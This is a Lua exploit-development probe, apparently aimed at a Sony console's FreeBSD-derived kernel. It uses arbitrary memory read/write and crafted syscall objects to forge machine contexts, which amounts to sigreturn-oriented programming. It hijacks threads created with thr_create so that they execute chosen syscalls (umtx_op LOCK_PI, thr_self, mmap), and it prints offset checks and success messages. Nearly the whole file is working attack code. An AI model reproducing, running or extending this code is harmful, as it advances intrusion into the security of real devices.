-- CRASH_CLASS: MODERATE
-- PROBE 142e: thr_create LOCK_PI — clean getcontext + correct offsets
--
-- 142d proved:
--   RIP at ctx+0xE0 (SROP position, correct)
--   CS=0x43 at ctx+0xE8 (NOT +0xD8 as SROP assumed!)
--   RSP at ctx+0xF8 (SROP position, correct)
--   GPRs at standard mcontext offsets within MC=0x40
--
-- Strategy: getcontext fills ALL fields correctly (CS, SS, RFLAGS).
-- We only modify GPRs and RIP/RSP. Don't touch CS/SS/RFLAGS.
-- Thread calls LOCK_PI → if it works, futex gets TID and thread blocks.

print("=== PROBE 142e: THR LOCK_PI CLEAN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- Confirmed getcontext/thr_create mcontext layout (MC=0x40):
-- GPRs at standard FreeBSD offsets within mcontext
local MC = 0x40
local O_RDI = MC + 0x08     -- 0x48
local O_RSI = MC + 0x10     -- 0x50
local O_RDX = MC + 0x18     -- 0x58
local O_RCX = MC + 0x20     -- 0x60
local O_R8  = MC + 0x28     -- 0x68
local O_R9  = MC + 0x30     -- 0x70
local O_RAX = MC + 0x38     -- 0x78
local O_R10 = MC + 0x50     -- 0x90
-- Control regs (Sony removed 4 trap/segment fields, -0x20 shift)
local O_RIP = MC + 0xA0     -- 0xE0 (confirmed)
local O_CS  = MC + 0xA8     -- 0xE8 (confirmed: CS=0x43 here)
local O_RFLAGS = MC + 0xB0  -- 0xF0 (between CS and RSP)
local O_RSP = MC + 0xB8     -- 0xF8 (confirmed)
local O_SS  = MC + 0xC0     -- 0x100 (after RSP)

-- Get syscall instruction address
local base_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(base_ctx)) end)
local base_rip = rq(base_ctx + O_RIP)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

-- Verify getcontext layout
print("getctx CS(+0xE8)=0x" .. string.format("%X", safe_rd(base_ctx + 0xE8) or 0))
print("getctx RFLAGS(+0xF0)=" .. hex(safe_rq(base_ctx + 0xF0)))
print("getctx SS(+0x100)=0x" .. string.format("%X", safe_rd(base_ctx + 0x100) or 0))

-- SROP helper (for main thread only)
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(base_ctx)) end)
    wq(base_ctx + O_RIP, sc_addr)
    wq(base_ctx + O_RAX, uint64(num))
    if a1 then wq(base_ctx + O_RDI, a1) end
    if a2 then wq(base_ctx + O_RSI, a2) end
    if a3 then wq(base_ctx + O_RDX, a3) end
    if a4 then wq(base_ctx + O_R10, a4) end
    if a5 then wq(base_ctx + O_R8, a5) end
    if a6 then wq(base_ctx + O_R9, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(base_ctx)) end)
    return rv
end

-- Main TID
local tid_buf = gpu + 0x100
wq(tid_buf, uint64(0))
srop(432, ua(tid_buf))
local main_tid = safe_rq(tid_buf)
local mt_h, mt_l = get_hi_lo(main_tid)
print("main_TID=" .. mt_l)

-- Sleep helper
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(300000000))
local function msleep()
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

-- Verify main LOCK_PI
local test_f = gpu + 0x200
memory.write_dword(test_f, 0)
local rv_t = srop(454, ua(test_f), uint64(12), uint64(0), uint64(0), uint64(0))
local tf_v = safe_rd(test_f)
print("main_LOCK_PI: ret=" .. hex(rv_t) .. " futex=" .. string.format("0x%X", tf_v or 0))

--------------------------------------------------------------------
-- [A] Thread LOCK_PI: getcontext + modify ONLY GPRs/RIP/RSP
-- Leave CS/SS/RFLAGS from getcontext untouched
--------------------------------------------------------------------
print("")
print("--- [A] Thread LOCK_PI (clean getctx) ---")

local futex_a = gpu + 0x1000
memory.write_dword(futex_a, 0)

-- Thread stack with return-to-zero (thread crashes after syscall returns)
local stack_a = gpu + 0x10000
for off = 0, 0x1FFF, 4 do memory.write_dword(stack_a + off, 0) end

-- Build thread context from getcontext
local ctx_a = gpu + 0x20000
for off = 0, 0x4FF, 4 do memory.write_dword(ctx_a + off, 0) end
pcall(function() return sc_gc(uint64(ctx_a)) end)

-- Verify CS/SS/RFLAGS are correct from getcontext
local gc_cs = safe_rd(ctx_a + O_CS)
local gc_ss = safe_rd(ctx_a + O_SS)
local gc_rfl = safe_rq(ctx_a + O_RFLAGS)
print("[A] getctx CS=0x" .. string.format("%X", gc_cs or 0))
print("[A] getctx SS=0x" .. string.format("%X", gc_ss or 0))
print("[A] getctx RFLAGS=" .. hex(gc_rfl))

-- Modify ONLY: RIP, RAX, RDI, RSI, RDX, R10, R8, RSP
-- Leave CS, SS, RFLAGS untouched (getcontext values are correct)
wq(ctx_a + O_RIP, sc_addr)               -- syscall instruction
wq(ctx_a + O_RAX, uint64(454))            -- umtx_op
wq(ctx_a + O_RDI, ua(futex_a))            -- futex addr
wq(ctx_a + O_RSI, uint64(12))             -- LOCK_PI
wq(ctx_a + O_RDX, uint64(0))
wq(ctx_a + O_R10, uint64(0))
wq(ctx_a + O_R8, uint64(0))
wq(ctx_a + O_R9, uint64(0))
wq(ctx_a + O_RSP, ua(stack_a + 0x1800))   -- thread stack

local tid_a = gpu + 0x30000
wq(tid_a, uint64(0xDEADDEAD))

print("[A] Creating thread (LOCK_PI)...")
local ok_a, rv_a = pcall(function()
    return sc_thr_create(uint64(ctx_a), uint64(tid_a), uint64(0))
end)
local ntid_a = safe_rq(tid_a)
local na_h, na_l = get_hi_lo(ntid_a)
print("[A] ok=" .. tostring(ok_a) .. " rv=" .. tostring(rv_a) .. " tid=" .. na_l)

-- Read futex IMMEDIATELY (before any crash signal propagates)
local fva_imm = safe_rd(futex_a)
print("[A] futex_imm=0x" .. string.format("%X", fva_imm or 0))

-- Wait 300ms
msleep()

-- Check again
print("[A] alive pid=" .. to_num(sc20()))
local fva = safe_rd(futex_a)
print("[A] futex=0x" .. string.format("%X", fva or 0))
if fva and fva ~= 0 then
    print("[A] *** THREAD LOCK_PI SUCCEEDED! futex=0x" .. string.format("%X", fva) .. " ***")
    if fva == na_l or fva == 1 then
        print("[A] *** CONFIRMED: CHILD THREAD EXECUTED SYSCALL! ***")
    end
end

-- Check if thread still alive (LOCK_PI should block it)
if na_l ~= 0 and na_l ~= 0xDEADDEAD then
    local ok_k, rv_k = pcall(function()
        return make_syscall(433)(uint64(na_l), uint64(0))
    end)
    print("[A] thr_kill(0)=" .. tostring(rv_k) .. " (0=alive,-1=dead)")
end

--------------------------------------------------------------------
-- [B] Thread thr_self: write TID to GPU memory
--------------------------------------------------------------------
print("")
print("--- [B] Thread thr_self (write TID) ---")

local tid_out_b = gpu + 0x2000
memory.write_dword(tid_out_b, 0xBBBBBBBB)
memory.write_dword(tid_out_b + 4, 0xBBBBBBBB)

local stack_b = gpu + 0x14000
for off = 0, 0x1FFF, 4 do memory.write_dword(stack_b + off, 0) end

local ctx_b = gpu + 0x28000
for off = 0, 0x4FF, 4 do memory.write_dword(ctx_b + off, 0) end
pcall(function() return sc_gc(uint64(ctx_b)) end)

wq(ctx_b + O_RIP, sc_addr)
wq(ctx_b + O_RAX, uint64(432))    -- thr_self
wq(ctx_b + O_RDI, ua(tid_out_b))  -- output pointer
wq(ctx_b + O_RSP, ua(stack_b + 0x1800))

local tid_b = gpu + 0x30010
wq(tid_b, uint64(0xDEADDEAD))

print("[B] Creating thread (thr_self)...")
local ok_b, rv_b = pcall(function()
    return sc_thr_create(uint64(ctx_b), uint64(tid_b), uint64(0))
end)
local ntid_b = safe_rq(tid_b)
local nb_h, nb_l = get_hi_lo(ntid_b)
print("[B] ok=" .. tostring(ok_b) .. " rv=" .. tostring(rv_b) .. " tid=" .. nb_l)

-- Read immediately
local tself_imm = safe_rq(tid_out_b)
print("[B] tid_out_imm=" .. hex(tself_imm))

msleep()

print("[B] alive pid=" .. to_num(sc20()))
local tself = safe_rq(tid_out_b)
local ts_h, ts_l = get_hi_lo(tself)
print("[B] tid_out=" .. hex(tself))
if ts_l ~= 0xBBBBBBBB and ts_l ~= 0 then
    print("[B] *** THREAD WROTE TID: " .. ts_l .. " ***")
    if ts_l == nb_l then
        print("[B] *** TID MATCHES! THREAD EXECUTION CONFIRMED! ***")
    end
end

--------------------------------------------------------------------
-- [C] Thread mmap: create new mapping (detectable via sys 674)
--------------------------------------------------------------------
print("")
print("--- [C] Thread mmap (create mapping) ---")

local stack_c = gpu + 0x18000
for off = 0, 0x1FFF, 4 do memory.write_dword(stack_c + off, 0) end

-- Count mappings before
local rv_624_before = srop(624)
local bef_h, bef_l = get_hi_lo(rv_624_before)
print("[C] sys624_before=" .. bef_l)

local ctx_c = gpu + 0x30100
for off = 0, 0x4FF, 4 do memory.write_dword(ctx_c + off, 0) end
pcall(function() return sc_gc(uint64(ctx_c)) end)

-- Thread calls mmap(0, 0x4000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0)
wq(ctx_c + O_RIP, sc_addr)
wq(ctx_c + O_RAX, uint64(477))    -- mmap
wq(ctx_c + O_RDI, uint64(0))
wq(ctx_c + O_RSI, uint64(0x4000))
wq(ctx_c + O_RDX, uint64(3))      -- RW
wq(ctx_c + O_R10, uint64(0x1002)) -- ANON|PRIVATE
wq(ctx_c + O_R8, uint64("0xFFFFFFFFFFFFFFFF"))
wq(ctx_c + O_R9, uint64(0))
wq(ctx_c + O_RSP, ua(stack_c + 0x1800))

local tid_c = gpu + 0x30020
wq(tid_c, uint64(0xDEADDEAD))

print("[C] Creating thread (mmap)...")
local ok_c, rv_c = pcall(function()
    return sc_thr_create(uint64(ctx_c), uint64(tid_c), uint64(0))
end)
local ntid_c = safe_rq(tid_c)
print("[C] ok=" .. tostring(ok_c) .. " rv=" .. tostring(rv_c) .. " tid=" .. hex(ntid_c))

msleep()

print("[C] alive pid=" .. to_num(sc20()))
local rv_624_after = srop(624)
local aft_h, aft_l = get_hi_lo(rv_624_after)
print("[C] sys624_after=" .. aft_l)
local delta = aft_l - bef_l
print("[C] sys624_delta=" .. delta)
if delta >= 5 then
    print("[C] *** THREAD CREATED MAPPING (sys624 +5)! ***")
end

--------------------------------------------------------------------
-- [D] Thread LOCK_PI with UMTX_ABSTIME timeout
-- Even if LOCK_PI can't block, maybe it can trylock with timeout=0
--------------------------------------------------------------------
print("")
print("--- [D] Thread LOCK_PI w/ timeout ---")

local futex_d = gpu + 0x3000
memory.write_dword(futex_d, 0)

local stack_d = gpu + 0x1C000
for off = 0, 0x1FFF, 4 do memory.write_dword(stack_d + off, 0) end

-- Put a zero timeout struct on the stack for the thread
-- timeout = {tv_sec=0, tv_nsec=0} = try-lock only
local timeout_d = gpu + 0x4000
wq(timeout_d, uint64(0))
wq(timeout_d + 8, uint64(0))

local ctx_d = gpu + 0x38000
for off = 0, 0x4FF, 4 do memory.write_dword(ctx_d + off, 0) end
pcall(function() return sc_gc(uint64(ctx_d)) end)

-- LOCK_PI with timeout (arg5 = timeout_ptr)
-- _umtx_op(futex, LOCK_PI, 0, 0, timeout)
wq(ctx_d + O_RIP, sc_addr)
wq(ctx_d + O_RAX, uint64(454))
wq(ctx_d + O_RDI, ua(futex_d))
wq(ctx_d + O_RSI, uint64(12))     -- LOCK_PI
wq(ctx_d + O_RDX, uint64(0))
wq(ctx_d + O_R10, uint64(0))
wq(ctx_d + O_R8, ua(timeout_d))   -- timeout ptr
wq(ctx_d + O_RSP, ua(stack_d + 0x1800))

local tid_d = gpu + 0x30030
wq(tid_d, uint64(0xDEADDEAD))

print("[D] pre-futex=0x" .. string.format("%X", safe_rd(futex_d) or 0))
print("[D] Creating thread (LOCK_PI+timeout)...")
local ok_d, rv_d = pcall(function()
    return sc_thr_create(uint64(ctx_d), uint64(tid_d), uint64(0))
end)
local ntid_d = safe_rq(tid_d)
local nd_h, nd_l = get_hi_lo(ntid_d)
print("[D] ok=" .. tostring(ok_d) .. " rv=" .. tostring(rv_d) .. " tid=" .. nd_l)

local fvd_imm = safe_rd(futex_d)
print("[D] futex_imm=0x" .. string.format("%X", fvd_imm or 0))

msleep()

print("[D] alive pid=" .. to_num(sc20()))
local fvd = safe_rd(futex_d)
print("[D] futex=0x" .. string.format("%X", fvd or 0))
if fvd and fvd ~= 0 then
    print("[D] *** THREAD LOCK_PI+TIMEOUT SUCCEEDED! ***")
end

--------------------------------------------------------------------
-- [E] Verify: scan for 0x3B (SS) near CS position
--------------------------------------------------------------------
print("")
print("--- [E] SS position scan ---")
local scan_ctx = gpu + 0x40000
for off = 0, 0x1FF, 4 do memory.write_dword(scan_ctx + off, 0xCC) end
pcall(function() return sc_gc(uint64(scan_ctx)) end)

print("[E] Scanning for SS=0x3B:")
for off = 0, 0x1FF, 4 do
    local v = safe_rd(scan_ctx + off)
    if v == 0x3B then
        print(string.format("[E] +0x%03X = 0x3B (SS candidate!)", off))
    end
end

-- Also check the full control reg area
print("[E] Control regs area (+0xE0 to +0x110):")
for off = 0xE0, 0x110, 8 do
    local v = safe_rq(scan_ctx + off)
    if v then
        print(string.format("[E] +0x%03X: %s", off, hex(v)))
    end
end

print("[E] pid=" .. to_num(sc20()))
print("=== DONE ===")
